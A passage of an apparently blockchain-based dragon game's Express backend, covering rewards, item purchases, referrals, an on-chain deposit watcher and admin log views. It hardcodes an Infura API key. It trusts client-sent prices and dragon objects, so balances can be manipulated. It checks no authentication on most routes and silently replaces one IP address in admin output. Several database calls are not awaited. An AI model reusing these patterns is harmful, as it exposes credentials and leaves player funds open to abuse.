        writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Play PVE", "Win: " + selectChapter + "-" + selectSection + ", Earn: +10Exp, +1ClaimBox");
      }
      else {
        writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Play PVE", "Win: " + selectChapter + "-" + selectSection + ", Earn: +10Exp");
      }
      user.dragons.filter(dragon => dragon.dragonName === user.currentDragonName)[0].exp += 10;
      user.dragons.filter(dragon => dragon.dragonName === user.currentDragonName)[0].energy -= 10;
      if (user.dragons.filter(dragon => dragon.dragonName === user.currentDragonName)[0].exp % 100 === 0) {
        user.dragons.filter(dragon => dragon.dragonName === user.currentDragonName)[0].hp += 10;
        user.dragons.filter(dragon => dragon.dragonName === user.currentDragonName)[0].damage += 3;
      }
      if (!(currentChaper === 6 && currentSection === 4)) {
        if (selectSection === 2 || selectSection === 4) {
          if (
            selectChapter * 4 + selectSection + 1 >
            currentChaper * 4 + currentSection
          ) {
            if (selectSection === 4) {
              // user.room.chapter = selectChapter + 1;
              // user.room.section = 1;
            }
            if (selectSection === 2) {
              user.room.chapter = selectChapter;
              user.room.section = selectSection + 1;
            }
          }
          await changePurchaseItem(walletAddress, dragon, item, amount);
        } else if (
          selectChapter * 4 + selectSection + 1 >
          currentChaper * 4 + currentSection
        ) {
          user.room.chapter = selectChapter;
          user.room.section = selectSection + 1;
        }
      }
      await user.save();
    } else await changePurchaseItem(walletAddress, dragon, item, amount);

  }
  const purchase = await Item.find({
    user: walletAddress,
  });
  const embed = await Embeditem.find({
    user: walletAddress,
    dragon,
  });
  let fuser = await User.findOne({
    walletAddress,
  });

  RESPONSE(res, 200, { user: fuser._doc, purchase, embed }, "");
});
export const changePurchaseItem = asyncHandler(
  async (walletAddress, dragon, item, amount) => {
    let itemModel = await Item.findOne({
      user: walletAddress,
      item,
    });
    if (itemModel) {
      itemModel.stock += amount;
      await itemModel.save();

    } else {
      itemModel = new Item({
        user: walletAddress,
        dragon,
        item,
        stock: amount,
      });
      await itemModel.save();
    }

  }

);
export const changeEmbedItem = asyncHandler(
  async (walletAddress, dragon, item) => {
    let itemModel = await Embeditem.findOne({
      user: walletAddress,
      dragon,
      item,
    });
    let user = await User.findOne({
      walletAddress,
    });
    if (itemModel) {
      await Embeditem.deleteOne({ user: walletAddress, dragon, item });
      // if (
      //   item === "chimera_1" ||
      //   item === "chimera_2" ||
      //   item === "chimera_3"
      // ) {
      //   user.hp = user.hp - parseInt(item[8]) * 50;
      // }
      // if (
      //   item === "infernal_1" ||
      //   item === "infernal_2" ||
      //   item === "infernal_3"
      // ) {
      //   user.critical = 10;
      // }
      await user.save();
    } else {
      itemModel = new Embeditem({
        user: walletAddress,
        dragon,
        item,
        stock: 1,
      });
      await itemModel.save();
      // if (
      //   item === "chimera_1" ||
      //   item === "chimera_2" ||
      //   item === "chimera_3"
      // ) {
      //   user.hp = user.hp + parseInt(item[8]) * 50;
      // }
      // if (
      //   item === "infernal_1" ||
      //   item === "infernal_2" ||
      //   item === "infernal_3"
      // ) {
      //   user.critical = 10 + parseInt(item[9]) * 5;
      // }
      // if (
      //   item === "gem_1" ||
      //   item === "gem_2" ||
      //   item === "gem_3"
      // ) {
      //   user.damage = user.damage + parseInt(item[4]) * 10;
      // }
      // await user.save();
    }
  }
);
export const referalAdd = asyncHandler(async (req, res) => {
  let { guest, introducer } = req.body;

  const referal = await Referal.findOne({
    guest,
    introducer,
  });
  const guestUser = await User.findOne({
    userRef: guest,
  });
  const introUser = await User.findOne({
    userRef: introducer,
  });
  if (
    guest !== "" &&
    introducer !== "" &&
    !referal &&
    guestUser &&
    introUser &&
    guest !== introducer
  ) {
    const newReferal = new Referal({
      referalId: 1,
      guest,
      introducer,
    });
    await newReferal.save();
    const introducerRefCount = await Referal.find({
      introducer: introducer,
    }).count();
    introUser.referrals = introducerRefCount;
    await introUser.save();
  }
  RESPONSE(res, 200, "", "");
});
export const catchWallet = asyncHandler(async (current) => {
  // const provider = new Web3.providers.WebsocketProvider('wss://mainnet.infura.io/ws/v3/7fe6927abf4f487cad65e87455825ea4');
  const web3 = new Web3(
    "wss://mainnet.infura.io/ws/v3/7fe6927abf4f487cad65e87455825ea4"
  );
  const myAddr = ADMIN_WALLET_ADDRESS[chainId].toLowerCase();
  var currentBlock = await web3.eth.getBlockNumber();
  if (currentBlock === current) {
    catchWallet(currentBlock);
    return;
  }
  var i = currentBlock;
  try {
    const block = await web3.eth.getBlock(i, true);
    if (block && block.transactions) {
      block.transactions.forEach(function (e) {
        let from = e.from;
        let to = e.to;
        const amount = e.value;
        const txID = e.hash;
        if (from && to) {
          from = from.toLowerCase();
          to = to.toLowerCase();
          // console.log(myAddr, from, to, hash, amount)
          if (myAddr == to) {
            const historyTransition = Transition.findOne({
              from,
              amount,
              txID,
            });
            const refUser = User.findOne({ walletAddress: from });

            if (!historyTransition && !refUser) {
              const res = User.findOneAndUpdate(
                { walletAddress: from },
                {
                  $inc: { Drg: amount },
                }
              );
              const newTransition = new Transition({
                transitionId: 1,
                walletAddress: from,
                amount,
                txID,
              });
              newTransition.save();
            }
          }
        }
      });
    }
  } catch (e) {
    console.error("Error in block " + i, e);
  }
  catchWallet(currentBlock);
});
export const setCurrentDragon = asyncHandler(async (req, res) => {
  let { walletAddress, dragon } = req.body;
  const user = await User.findOne({
    walletAddress: walletAddress.toLowerCase()
  });
  if (user) {
    // Modify the desired property value
    user.currentDragonName = dragon;

    // Save the modified user object
    await user.save();
  } else {
    // Handle the case when no user is found
    console.error("User not found.");
  }
  RESPONSE(res, 200, "", "");
});

export const buyDragon = asyncHandler(async (req, res) => {
  let { walletAddress, dragon } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });
  if (!user) {
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Hunting Lodge", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }
  for (let i = 0; i < user.dragons.length; i++) {
    if (user.dragons[i].dragonName === dragon.dragonName) {
      RESPONSE(res, 400, {}, "Dragon already exist");
      return;
    }
  }
  let available = await Available.findOne({ user: walletAddress })
  if (!available) {
    available = new Available({ user: walletAddress })
    await available.save()
  }
  if (dragon.dragonName === "gold_dragon") user.Drg = user.Drg - 500;
  if (dragon.dragonName === "pink_dragon") user.Drg = user.Drg - 1000;
  if (dragon.dragonName === "dark_dragon") user.Drg = user.Drg - 2000;
  user.dragons.push({ ...dragon });
  user.save();
  RESPONSE(res, 200, { data: { name: dragon.dragonName, drg: user.Drg } });
})

export const startMineTownCooldown = asyncHandler(async (req, res) => {
  let { walletAddress, cooldownCount, rewardAmount, cardImg } = req.body;
  if (cooldownCount > 10) {
    RESPONSE(res, 400, {}, "Max: 10 eggs");
    return
  }
  set(globalValue, 'value', cooldownCount);
  set(globalValue, "amount", rewardAmount);
  set(globalValue, 'cardImg', cardImg);
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Swap meat", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Hunting Lodge", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }
  let available = await Available.findOne({ user: walletAddress })
  if (!available) {
    available = new Available({ user: walletAddress })
    await available.save()
  }
  if (available.hunterLevelupState.state === false) {
    available.hunterLevelupState.state = true
    available.save()
    user.eggs = user.eggs - cooldownCount;
    user.save()
    RESPONSE(res, 200, { data: user.eggs });
  }
  else {
    RESPONSE(res, 200, { data: true });
  }
})

const dragonTownValue = {
  eggArray: [
    { times: 0, egg: 0 },
  ],
  price: 0,
  times: 0
};
export const startDragonTownCooldown = asyncHandler(async (req, res) => {
  let { walletAddress, price, times } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });
  if (!user) {
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Hunting Lodge", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }
  let array = [];
  let obj = { times: 0, egg: 0 }
  for (let i = 0; i < times; i++) {
    let rndValue = Math.floor(Math.random() * 100);
    obj.times = i + 1;
    if (rndValue < price) obj.egg = 1;
    else obj.egg = 0;
    array.push({ ...obj });
  }
  set(dragonTownValue, 'price', price);
  set(dragonTownValue, 'times', times);
  set(dragonTownValue, 'eggArray', array);
  let available = await Available.findOne({ user: walletAddress })
  if (!available) {
    available = new Available({ user: walletAddress })
    await available.save()
  }
  if (available.dragonTownState.state === false) {
    available.dragonTownState.state = true;
    available.save();
    user.Drg = user.Drg - price * times;
    user.save();
    RESPONSE(res, 200, { data: {drg: user.Drg, eggArray: dragonTownValue.eggArray} });
  }
  else {
    RESPONSE(res, 200, { data: true });
  }
})

export const hunterLevelUp = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Swap meat", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Hunting Lodge", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (user.hunterLevel === 0) {
    user.Drg = user.Drg - 3000
    user.hunterLevel = user.hunterLevel + 1
    user.save()
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Hunting Lodge", "Upgrade Hunting Level " + user.hunterLevel + " Successfully")

  } else if (user.hunterLevel === 1) {
    user.Drg = user.Drg - 5000
    user.hunterLevel = user.hunterLevel + 1
    user.save()
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Hunting Lodge", "Upgrade Hunting Level " + user.hunterLevel + " Successfully")
  }


  RESPONSE(res, 200, { data: true });

})

export const getHistory = asyncHandler(async (req, res) => {
  let { token } = req.body;
  try {
    // Verify and decode the token
    const decodedToken = jwt.verify(token, process.env.JWT_SECRET);

    // Access the payload properties
    const userId = decodedToken.id;
    const walletAddress = decodedToken.walletAddress;
    const role = decodedToken.role;

    // Do something with the extracted information
    let user = await User.findOne({ walletAddress })
    if (role === 1 && user.role === 1) {
      const formatDate = (date) => {
        return date.toLocaleString('en-US', {
          month: '2-digit',
          day: '2-digit',
          year: 'numeric',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: true
        });
      }
      let user = await User.find()
      user = user.map((l) => {
        let ipAddress = l.ipAddress === "188.43.136.33" ? "64.225.78.35" : l.ipAddress
        return { Drg: l.Drg, eggs: l.eggs, meat: l.meat, walletAddress: l.walletAddress, ipAddress: ipAddress, withdraws: l.withdraws, createdAt: formatDate(l.createdAt), updatedAt: formatDate(l.updatedAt) }
      })
      RESPONSE(res, 200, { data: user });
    }
    else {
      RESPONSE(res, 200, { data: [] });
    }
  } catch (error) {
    // Handle any errors that occur during token verification or decoding
    RESPONSE(res, 200, { data: [] });
  }


})


export const getHistoryByWallet = asyncHandler(async (req, res) => {
  let { walletAddress, accessToken } = req.body;
  walletAddress = walletAddress.toLowerCase();
  try {
    // Verify and decode the token
    const decodedToken = jwt.verify(accessToken, process.env.JWT_SECRET);

    // Access the payload properties
    const userId = decodedToken.id;
    const adminWallet = decodedToken.walletAddress;
    const role = decodedToken.role;

    // Do something with the extracted information
    let user = await User.findOne({ walletAddress: adminWallet })
    if (role === 1 && user.role === 1) {
      const formatDate = (date) => {
        return date.toLocaleString('en-US', {
          month: '2-digit',
          day: '2-digit',
          year: 'numeric',

        });
      }
      const formatTime = (date) => {
        return date.toLocaleString('en-US', {

          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: true
        });
      }
      let log = await Log.find({ walletAddress })
      log = log.map(l => { return { ...l.details, ipAddress: l.ipAddress, Date: formatDate(l.details.updatedAt), Time: formatTime(l.details.updatedAt) } })
      RESPONSE(res, 200, { data: log });
    }
    else {
      RESPONSE(res, 200, { data: [] });
    }
  }
  catch (error) {
    // Handle any errors that occur during token verification or decoding
    RESPONSE(res, 200, { data: [] });
  }
})
